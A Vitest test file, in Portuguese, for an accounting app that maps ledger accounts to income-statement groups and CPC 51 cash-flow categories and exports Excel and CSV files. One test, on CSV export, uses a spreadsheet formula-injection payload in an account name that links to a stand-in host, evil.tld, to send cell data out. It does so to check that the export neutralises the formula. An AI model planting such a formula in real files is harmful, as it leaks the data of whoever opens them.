import { describe, expect, it } from "vitest";
import { POLITICA_PADRAO, deParaCPC51 } from "../cpc51.js";
import { filtrarDePara, montarDePara, porGrupo, resumoDePara } from "../depara.js";
import { linhaCSV, montarWorkbookDePara, situacaoDaLinha } from "../exportacaoDePara.js";

const conta = (codigo, saldo, extra = {}) => ({
  conta: codigo,
  saldo,
  historico: "",
  deb: saldo < 0 ? -saldo : 0,
  cre: saldo > 0 ? saldo : 0,
  n: 1,
  ...extra,
});

const CONTAS = [
  conta("3110101", 100000), // mensalidades → operacional
  conta("4110101", -40000), // custos → operacional
  conta("4210201", 1500, { historico: "RENDIMENTO APLICACAO, JUROS RECEBIDOS" }), // rec. financeiras → investimento, a revisar
  conta("4210101", -2500), // desp. financeiras → financiamento, a revisar
  conta("6110107", -4000), // IRPJ/CSLL → tributos
  conta("1110101", 300), // fora da DRE
];

const GRUPO = {
  "3110101": "REC_MENSALIDADES",
  "4110101": "CUSTOS",
  "4210201": "REC_FIN",
  "4210101": "DESP_FIN",
  "6110107": "IRPJ_CSLL",
};
const grupoDe = (c) => GRUPO[c] || "IGNORAR";

const montar = (opts = {}) => montarDePara(CONTAS, { grupoDe, ...opts });

describe("o De-Para descreve o destino de cada conta nos dois eixos", () => {
  it("traz uma linha por conta de resultado, da maior para a menor", () => {
    const linhas = montar();
    expect(linhas).toHaveLength(CONTAS.length);
    const valores = linhas.map((l) => Math.abs(l.saldo));
    expect(valores).toEqual([...valores].sort((a, b) => b - a));
  });

  it("usa o nome do plano de contas e cai no histórico quando não há nome", () => {
    const linhas = montar({ nomes: { "3110101": "MENSALIDADES GRADUAÇÃO" } });
    const porConta = Object.fromEntries(linhas.map((l) => [l.conta, l]));
    expect(porConta["3110101"].descricao).toBe("MENSALIDADES GRADUAÇÃO");
    expect(porConta["4210201"].descricao).toBe("RENDIMENTO APLICACAO");
  });

  it("marca a conta sem grupo como fora da DRE, e não como resolvida", () => {
    const fora = montar().find((l) => l.conta === "1110101");
    expect(fora.semGrupo).toBe(true);
    expect(fora.categoria).toBe(null);
    expect(fora.categoriaNome).toBe("Não entra na DRE");
    expect(fora.pendente).toBe(true);
  });
});

describe("a origem da decisão é registrada nos dois eixos", () => {
  it("separa grupo sugerido de grupo decidido à mão", () => {
    const linhas = montar({ tocadas: { "4110101": true } });
    const porConta = Object.fromEntries(linhas.map((l) => [l.conta, l]));
    expect(porConta["4110101"].origemGrupo).toBe("manual");
    expect(porConta["3110101"].origemGrupo).toBe("sugerido");
  });

  it("uma categoria escolhida à mão encerra o pedido de revisão daquela conta", () => {
    const antes = montar().find((l) => l.conta === "4210201");
    expect(antes.revisar).toBeTruthy();
    expect(antes.origemCategoria).toBe("padrão do grupo");

    const depois = montar({ categoriaPorConta: { "4210201": "OPERACIONAL" } })
      .find((l) => l.conta === "4210201");
    expect(depois.categoria).toBe("OPERACIONAL");
    expect(depois.categoriaManual).toBe(true);
    expect(depois.revisar).toBe(null);
    expect(depois.pendente).toBe(false);
  });

  it("a política contábil também encerra a revisão, sem decisão conta a conta", () => {
    const linhas = montar({ politica: { ...POLITICA_PADRAO, financiarClientesEhAtividadePrincipal: true } });
    const desp = linhas.find((l) => l.conta === "4210101");
    expect(desp.categoria).toBe("OPERACIONAL");
    expect(desp.revisar).toBe(null);
  });
});

describe("o resumo conta o trabalho que falta, não o que já tem rótulo", () => {
  it("não considera resolvida a conta fora da DRE nem a que pede revisão", () => {
    const r = resumoDePara(montar());
    expect(r.total).toBe(6);
    expect(r.comGrupo).toBe(5);
    expect(r.semGrupo).toBe(1);
    expect(r.valorSemGrupo).toBeCloseTo(300, 2);
    expect(r.aRevisar).toBe(2); // as duas financeiras
    expect(r.valorARevisar).toBeCloseTo(4000, 2);
    expect(r.resolvidas).toBe(3);
    expect(r.completude).toBeCloseTo(3 / 6, 5);
  });

  it("sobe a completude conforme as pendências são decididas", () => {
    const r = resumoDePara(montar({
      categoriaPorConta: { "4210201": "OPERACIONAL", "4210101": "FINANCIAMENTO" },
    }));
    expect(r.aRevisar).toBe(0);
    expect(r.manuaisCategoria).toBe(2);
    expect(r.resolvidas).toBe(5);
  });
});

describe("filtros e agrupamento por destino", () => {
  it("filtra por situação, grupo e busca", () => {
    const linhas = montar({ tocadas: { "4110101": true } });
    expect(filtrarDePara(linhas, { situacao: "pendentes" }).map((l) => l.conta).sort())
      .toEqual(["1110101", "4210101", "4210201"]);
    expect(filtrarDePara(linhas, { situacao: "sem-grupo" })).toHaveLength(1);
    expect(filtrarDePara(linhas, { situacao: "manuais" }).map((l) => l.conta)).toEqual(["4110101"]);
    expect(filtrarDePara(linhas, { grupo: "CUSTOS" })).toHaveLength(1);
    expect(filtrarDePara(linhas, { categoria: "TRIBUTOS" }).map((l) => l.conta)).toEqual(["6110107"]);
    expect(filtrarDePara(linhas, { busca: "3110101" })).toHaveLength(1);
  });

  it("a leitura por grupo sai na ordem da DRE e conta o que falta revisar", () => {
    const grupos = porGrupo(montar());
    expect(grupos.map((g) => g.id)).toEqual([
      "REC_MENSALIDADES", "CUSTOS", "REC_FIN", "DESP_FIN", "IRPJ_CSLL", "IGNORAR",
    ]);
    expect(grupos.find((g) => g.id === "REC_FIN").aRevisar).toBe(1);
  });

  it("resume a situação de cada linha numa palavra só", () => {
    const linhas = montar({ tocadas: { "4110101": true } });
    const situacao = Object.fromEntries(linhas.map((l) => [l.conta, situacaoDaLinha(l)]));
    expect(situacao["1110101"]).toBe("Fora da DRE");
    expect(situacao["4210201"]).toBe("A revisar");
    expect(situacao["4110101"]).toBe("Decidida");
    expect(situacao["3110101"]).toBe("Automática");
  });
});

describe("o CSV protege o texto sem estragar o número", () => {
  it("neutraliza fórmula na descrição e deixa a despesa somável", () => {
    const linhas = montarDePara(
      [conta("4110101", -40000), conta("3110101", 100000)],
      { grupoDe, nomes: { "4110101": '=HYPERLINK("http://evil.tld?d="&A1,"clique")' } }
    );
    const csv = Object.fromEntries(linhas.map((l) => [l.conta, linhaCSV(l)]));

    // o texto vindo do plano de contas continua desarmado...
    expect(csv["4110101"]).toContain(`"'=HYPERLINK`);
    // ...e o valor negativo NÃO vira texto com aspa: o Excel precisa somá-lo
    expect(csv["4110101"].endsWith('"-40000,00"')).toBe(true);
    expect(csv["3110101"].endsWith('"100000,00"')).toBe(true);
  });
});

/* A garantia que impede as duas tabelas de divergirem. `deParaCPC51`
   continua sendo a fonte do entregável da Fase 2 (o Excel de seis abas)
   e `montarDePara` é a fonte da tela e do arquivo de parametrização —
   se um dia elas discordarem sobre o destino de uma conta, o app estaria
   dizendo duas coisas diferentes sobre o mesmo fato. */
describe("acordo com o De-Para do CPC 51", () => {
  it("as duas tabelas concordam conta a conta sobre grupo e categoria", () => {
    const opts = { grupoDe, categoriaPorConta: { "4210201": "OPERACIONAL" }, politica: POLITICA_PADRAO, nomes: {} };
    const a = montarDePara(CONTAS, opts);
    const b = deParaCPC51(CONTAS, opts);
    expect(a).toHaveLength(b.length);
    const porConta = Object.fromEntries(b.map((l) => [l.conta, l]));
    a.forEach((l) => {
      expect(l.grupo).toBe(porConta[l.conta].grupo);
      expect(l.categoria).toBe(porConta[l.conta].categoria);
      expect(l.categoriaNome).toBe(porConta[l.conta].categoriaNome);
      expect(l.saldo).toBeCloseTo(porConta[l.conta].saldo, 2);
    });
  });
});


/* A LEITURA POR DESTINO NO EXCEL É UMA TABELA EM DOIS NÍVEIS.
   O grupo é a linha visível e as contas que o formam ficam recolhidas
   logo abaixo — o mesmo "clique no grupo para ver as contas" da tela,
   dentro do arquivo entregue. O que estes testes congelam é o que faz a
   expansão VALER a pena: as contas debaixo de um grupo são exatamente as
   que somam o total impresso nele, e estão na mesma coluna de saldo. Se
   alguém um dia trocar a ordem de escrita e o bloco deixar de pertencer
   ao grupo de cima, a planilha continuaria bonita e passaria a mentir. */
describe("o resumo por grupo do Excel abre nas contas que o formam", () => {
  const contasDoResumo = async () => {
    const linhas = montar();
    const grupos = porGrupo(linhas);
    const wb = await montarWorkbookDePara(linhas, resumoDePara(linhas), grupos, {});
    return { grupos, ws: wb.getWorksheet("Resumo") };
  };

  it("põe o botão de expandir na linha do grupo, e não depois do bloco", async () => {
    const { ws } = await contasDoResumo();
    expect(ws.properties.outlineProperties.summaryBelow).toBe(false);
    expect(ws.properties.outlineLevelRow).toBe(1);
  });

  it("pendura cada conta no grupo de cima, recolhida", async () => {
    const { grupos, ws } = await contasDoResumo();
    const nomes = grupos.map((g) => g.nome);
    let grupoAtual = null;
    const vistas = {};
    ws.eachRow((row) => {
      const nivel = row.outlineLevel;
      const primeira = row.getCell(1).value;
      if (nivel === 0 && nomes.includes(primeira)) { grupoAtual = primeira; vistas[grupoAtual] = []; return; }
      if (nivel !== 1) return;
      expect(row.hidden).toBe(true);          // nasce recolhida
      expect(primeira).toBe(null);            // a coluna do grupo fica vazia na conta
      vistas[grupoAtual].push({ conta: row.getCell(2).value, saldo: row.getCell(6).value });
    });

    grupos.forEach((g) => {
      expect(vistas[g.nome].map((c) => c.conta)).toEqual(g.contas.map((l) => l.conta));
      expect(vistas[g.nome]).toHaveLength(g.n);
    });
  });

  it("soma na mesma coluna: o total do grupo é o das contas debaixo dele", async () => {
    const { grupos, ws } = await contasDoResumo();
    const porNome = Object.fromEntries(grupos.map((g) => [g.nome, g]));
    let atual = null;
    let soma = 0;
    const fechar = () => { if (atual) expect(soma).toBeCloseTo(porNome[atual].total, 2); };
    ws.eachRow((row) => {
      if (row.outlineLevel === 1) { soma += row.getCell(6).value; return; }
      const nome = row.getCell(1).value;
      if (!porNome[nome]) return;
      fechar();
      atual = nome;
      soma = 0;
      expect(row.getCell(6).value).toBeCloseTo(porNome[nome].total, 2);
      expect(row.getCell(7).value).toBe(porNome[nome].n);
    });
    fechar();
  });
});

/* ------------------------------------------------------------------ *
 * Contas sem movimento no período.
 * ------------------------------------------------------------------ */
const semMovimento = (codigo, historico) => ({
  conta: codigo, saldo: 0, deb: 0, cre: 0, historico, semMovimento: true, natureza: 1,
});

describe("o De-Para leva as contas sem movimento, marcadas", () => {
  const contas = [
    { conta: "3110101", saldo: 10000, deb: 0, cre: 10000, historico: "MENSALIDADE" },
    semMovimento("3110109", "POS-GRADUACAO"),
    { conta: "4120101", saldo: -2500, deb: 2500, cre: 0, historico: "ALUGUEL" },
  ];
  const grupoDe = (c) => (c[0] === "3" ? "REC_MENSALIDADES" : "DESP_ADM");
  const linhas = montarDePara(contas, { grupoDe, nomes: {} });

  it("a linha da conta zerada carrega semMovimento", () => {
    expect(linhas.find((l) => l.conta === "3110109").semMovimento).toBe(true);
    expect(linhas.find((l) => l.conta === "3110101").semMovimento).toBe(false);
  });

  it("o placar separa a pendência de cadastro da pendência que custa dinheiro", () => {
    const semGrupo = montarDePara(
      [semMovimento("9990001", "CONTA NOVA"), { conta: "9990002", saldo: -500, deb: 500, cre: 0, historico: "X" }],
      { grupoDe: () => "IGNORAR", nomes: {} }
    );
    const r = resumoDePara(semGrupo);
    expect(r.semMovimento).toBe(1);
    expect(r.pendenteSemMovimento).toBe(1);
    // A que custa dinheiro é a outra: R$ 500 fora da demonstração.
    expect(r.pendenteComMovimento).toBe(1);
    expect(r.valorSemGrupo).toBeCloseTo(500, 2);
  });

  it("o filtro separa com e sem movimento", () => {
    expect(filtrarDePara(linhas, { situacao: "sem-movimento" })).toHaveLength(1);
    expect(filtrarDePara(linhas, { situacao: "com-movimento" })).toHaveLength(2);
  });

  it("o Excel traz a coluna, e o formato de moeda fica na coluna do Saldo", async () => {
    /* O formato estava cravado na coluna 8. A coluna nova empurrou o
       Saldo para a 9 e o formato caía sobre a célula de texto ao lado —
       sem quebrar nada visivelmente. Ancorar em COLUNAS.length resolveu;
       este teste é o que impede a próxima coluna de repetir isso. */
    const wb = await montarWorkbookDePara(linhas, resumoDePara(linhas), porGrupo(linhas), {});
    const ws = wb.getWorksheet("De-Para");
    const cab = [];
    ws.getRow(1).eachCell((c) => cab.push(c.value));
    const iMovimento = cab.indexOf("Movimento no período") + 1;
    const iSaldo = cab.indexOf("Saldo") + 1;
    expect(iMovimento).toBeGreaterThan(0);
    expect(iSaldo).toBe(cab.length);

    const primeira = ws.getRow(2);
    expect(["com movimento", "sem movimento"]).toContain(primeira.getCell(iMovimento).value);
    // Saldo é NÚMERO com formato de moeda, não texto: o arquivo vira
    // conferência por totais no Excel.
    expect(typeof primeira.getCell(iSaldo).value).toBe("number");
    expect(primeira.getCell(iSaldo).numFmt).toBeTruthy();
    expect(primeira.getCell(iMovimento).numFmt).toBeFalsy();
  });

  it("o CSV também traz a coluna, e o saldo continua numérico", () => {
    const csv = linhaCSV(linhas.find((l) => l.conta === "3110109"));
    expect(csv).toContain('"sem movimento"');
    expect(csv.endsWith('"0,00"')).toBe(true);
  });
});
